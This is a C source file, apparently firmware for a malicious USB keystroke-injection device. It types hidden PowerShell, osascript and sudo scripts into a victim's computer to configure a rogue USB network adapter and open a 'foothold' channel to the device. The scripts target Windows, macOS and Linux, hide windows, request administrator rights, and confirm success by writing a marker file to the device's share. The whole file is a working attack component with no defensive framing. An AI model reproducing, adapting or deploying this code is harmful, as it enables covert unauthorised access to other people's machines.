// foothold.c
#include "comm_manager.h"
#include "payload_framework.h"

// Script templates for different OSes
static const char* NIC_SCRIPT_WINDOWS = 
    "powershell -windowstyle hidden $ConfirmPreference='None';"
    "Get-NetAdapter | Where-Object {$_.InterfaceDescription -like '*USB*'} | "
    "ForEach-Object { netsh interface ip set address name=$_.Name static 192.168.7.2 255.255.255.0; "
    "Write-Output 'CONNECTION_SUCCESS' > \\\\192.168.7.1\\share\\status.txt }";

static const char* NIC_SCRIPT_MACOS =
    "osascript -e 'do shell script \""
    "for iface in $(ifconfig | grep -o \"^en[0-9]*\"); do"
    "  if ifconfig $iface | grep -q \"media: autoselect\"; then"
    "    sudo ifconfig $iface inet 192.168.7.2 netmask 255.255.255.0;"
    "    echo CONNECTION_SUCCESS > /Volumes/share/status.txt;"
    "    break;"
    "  fi;"
    "done"
    "\" with administrator privileges'";

static const char* NIC_SCRIPT_LINUX =
    "sudo -S bash -c 'for iface in $(ls /sys/class/net/ | grep -v lo); do "
    "  if grep -q \"USB\" /sys/class/net/$iface/device/uevent 2>/dev/null; then "
    "    ip addr add 192.168.7.2/24 dev $iface; "
    "    ip link set $iface up; "
    "    echo CONNECTION_SUCCESS > /mnt/share/status.txt; "
    "    break; "
    "  fi; "
    "done'";

// Function to establish NIC foothold
bool establish_nic_foothold(PayloadContext* ctx) {
    // Set channel to connecting state
    comm_channels[COMM_CHANNEL_NIC].status = CHANNEL_STATUS_CONNECTING;
    
    // Configure USB NIC
    if (!nic_configure()) {
        comm_channels[COMM_CHANNEL_NIC].status = CHANNEL_STATUS_ERROR;
        return false;
    }
    
    // Also initialize mass storage for verification file
    mass_storage_configure_lightweight();
    
    // Select appropriate script based on OS
    const char* script = NULL;
    switch (ctx->detected_os) {
        case OS_WINDOWS:
            script = NIC_SCRIPT_WINDOWS;
            break;
        case OS_MACOS:
            script = NIC_SCRIPT_MACOS;
            break;
        case OS_LINUX:
            script = NIC_SCRIPT_LINUX;
            break;
        default:
            // Unsupported OS
            comm_channels[COMM_CHANNEL_NIC].status = CHANNEL_STATUS_UNAVAILABLE;
            return false;
    }
    
    // Execute the script using keyboard
    System.log("Executing NIC configuration script...");
    KeyboardHID.sendLine(script);
    
    // Wait for connection verification
    uint32_t start_time = System.getTimestamp();
    const uint32_t VERIFY_TIMEOUT_MS = 10000; // 10 seconds
    bool connection_verified = false;
    
    while (System.getTimestamp() - start_time < VERIFY_TIMEOUT_MS) {
        // Check for verification file
        if (mass_storage_file_exists("/share/status.txt")) {
            char buffer[64];
            if (mass_storage_read_file("/share/status.txt", buffer, sizeof(buffer)) > 0) {
                if (strstr(buffer, "CONNECTION_SUCCESS") != NULL) {
                    connection_verified = true;
                    break;
                }
            }
        }
        
        // Check if we're receiving network packets (alternative verification)
        if (nic_get_rx_packet_count() > 0) {
            connection_verified = true;
            break;
        }
        
        System.delay(500);
    }
    
    // Update connection state
    if (connection_verified) {
        comm_channels[COMM_CHANNEL_NIC].status = CHANNEL_STATUS_CONNECTED;
        System.log("NIC connection established successfully");
        return true;
    } else {
        comm_channels[COMM_CHANNEL_NIC].status = CHANNEL_STATUS_ERROR;
        System.log("Failed to establish NIC connection, falling back to keyboard");
        return false;
    }
}